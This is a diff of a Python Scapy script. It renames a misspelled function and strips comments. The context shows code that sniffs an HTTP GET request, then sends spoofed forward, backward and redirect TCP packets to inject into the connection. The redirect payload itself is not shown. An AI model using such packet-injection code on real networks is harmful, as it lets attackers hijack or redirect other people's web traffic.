@@ -17,7 +17,7 @@ def make_forward_packet(pkt):
 
     return fpacket
 
-def make_bacword_packet(pkt):
+def make_backword_packet(pkt):
     #print pkt.show()
     bpacket = pkt.copy()
     var_packet = pkt.copy()
@@ -27,7 +27,6 @@ def make_bacword_packet(pkt):
     del bpacket[IP].len
     
     bpacket[TCP].ack = pkt[TCP].seq + len(pkt.getlayer(Raw))
-    #bpacket[TCP].ack = pkt[TCP].seq + len(pkt.getlayer(Raw))
 
     bpacket[Ether].src = var_packet[Ether].dst
     bpacket[Ether].dst = var_packet[Ether].src
@@ -39,8 +38,6 @@ def make_bacword_packet(pkt):
     bpacket[TCP].sport = var_packet[TCP].dport
 
     return bpacket
-    #print bpacket[TCP].ack
-    #print bpacket.show()
 
 def make_redirect_packet(pkt):
     
@@ -73,14 +70,12 @@ def http_packet(packet):
         fpkt = make_forward_packet(packet)
         sendp(fpkt)
         
-        bpkt = make_bacword_packet(packet)
+        bpkt = make_backword_packet(packet)
         sendp(bpkt)
 
         rpkt_http = make_redirect_packet(packet)
         sendp(rpkt_http)
     
-
-
 sniff(filter='tcp port 80',lfilter=lambda p: "GET" in str(p),prn=http_packet,count=1)   #http packet capture
 
 
